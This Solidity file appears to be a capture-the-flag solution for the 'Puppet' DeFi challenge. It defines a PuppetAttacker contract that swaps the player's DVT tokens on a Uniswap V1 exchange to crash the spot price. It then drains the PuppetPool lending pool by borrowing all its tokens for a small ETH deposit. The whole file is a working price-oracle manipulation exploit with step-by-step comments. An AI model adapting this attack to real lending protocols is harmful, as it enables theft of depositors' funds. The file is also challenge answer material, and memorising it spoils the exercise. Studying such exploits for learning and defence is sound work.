// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

interface IUniswapV1Exchange {
    function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256 out);    
}

interface IPuppetPool {
    function borrow(uint256 amount, address recipient) external payable;
    function calculateDepositRequired(uint256 amount) external view returns (uint256);
}

contract PuppetAttacker {
    uint private initialPlayerTokens;
    uint private initialPoolTokens;

    address private uniswapExchange;
    address private lendingPool;
    address private token;
    address private player;

    constructor(address _uniswapExchange, address _lendingPool, address _token, address _player, 
    uint _initialPlayerTokens, uint _initialPoolTokens) payable {
        uniswapExchange = _uniswapExchange;
        lendingPool = _lendingPool;
        token = _token;
        player = _player;      
        initialPlayerTokens = _initialPlayerTokens;
        initialPoolTokens = _initialPoolTokens;
    }
    
    function attack() public {

        //before swapping from DVT => ETH, we need to give approval to Uniswap        
        IERC20(token).approve(uniswapExchange, initialPlayerTokens);

        //swap 1000 DVT => ETH => creates pool imbalance & allows us to get a low ETH/DVT conversion rate on PuppetPool
        uint256 out = IUniswapV1Exchange(uniswapExchange).tokenToEthSwapInput(initialPlayerTokens, 1, block.timestamp * 2); 
        console.log("ETH from swap: %s", out);

        uint requiredETH = IPuppetPool(lendingPool).calculateDepositRequired(initialPoolTokens);
        console.log("Required ETH to empty the pool: %s", requiredETH); // ~ 19.7 ETH

        IPuppetPool(lendingPool).borrow{value: requiredETH}(initialPoolTokens, player);
    } 

    receive() external payable {}  
}
